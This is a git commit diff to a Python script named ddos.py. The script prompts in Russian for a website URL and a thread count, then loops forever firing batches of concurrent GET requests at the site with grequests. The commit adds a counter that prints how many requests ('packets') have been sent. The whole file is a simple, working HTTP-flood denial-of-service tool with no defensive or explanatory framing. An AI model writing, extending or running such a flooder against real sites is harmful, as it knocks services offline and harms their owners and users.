5341e642367195be967c1d8b848a13010e6e6657
VaRaMBaZ1 <92698950+VaRaMBaZ1@users.noreply.github.com>
2022-05-19 14:12:38 +0800

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -2,9 +2,14 @@ import grequests
 
 site = input("Введите URL сайта: ")
 threads = int(input("Введите количество потоков: "))
+packet = 0
 
 while True:
     site_info = [site for x in range(threads)]
 
     response = (grequests.get(url) for url in site_info)
     resp = grequests.map(response)
+
+    packet += threads
+
+    print(f"Пакетов отправленно: {packet}")
